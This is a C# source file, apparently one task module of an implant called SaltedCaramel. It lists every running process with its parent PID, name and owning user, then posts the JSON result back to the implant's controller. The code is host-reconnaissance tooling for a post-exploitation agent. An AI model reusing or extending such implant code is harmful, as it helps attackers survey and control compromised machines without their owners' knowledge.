﻿using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SaltedCaramel.Tasks
{
    class ProcessList
    {
        internal static void Execute(SCTask task, SCImplant implant)
        {
            List<Dictionary<string, string>> procList = new List<Dictionary<string, string>>();
            foreach (Process proc in Process.GetProcesses())
            {
                Dictionary<string, string> procEntry = new Dictionary<string, string>();
                procEntry.Add("process_id", proc.Id.ToString());
                try
                {
                    procEntry.Add("parent_process_id", GetParentProcess(proc.Handle).ToString());
                }
                catch
                {
                    procEntry.Add("parent_process_id", "");
                }
                procEntry.Add("name", proc.ProcessName);
                procEntry.Add("user", GetProcessUser(proc.Id));
                procList.Add(procEntry);
            }

            SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procList));
            implant.PostResponse(response);
            implant.SendComplete(task.id);
        }

        internal static int GetParentProcess(IntPtr procHandle)
        {
            Win32.PROCESS_BASIC_INFORMATION procinfo = new Win32.PROCESS_BASIC_INFORMATION();
            int rl;
            int info = Win32.NtQueryInformationProcess(procHandle, 0, ref procinfo, Marshal.SizeOf(procinfo), out rl);
            return procinfo.InheritedFromUniqueProcessId.ToInt32();
        }

        internal static string GetProcessUser(int processId)
        {
            try
            {
                Process proc = Process.GetProcessById(processId);
                IntPtr procHandle = IntPtr.Zero;
                Win32.OpenProcessToken(proc.Handle, (uint)TokenAccessLevels.MaximumAllowed, out procHandle);
                return new WindowsIdentity(procHandle).Name;
            }
            catch // If we can't open a handle to the process it will throw an exception
            {
                return "";
            }
        }
    }
}
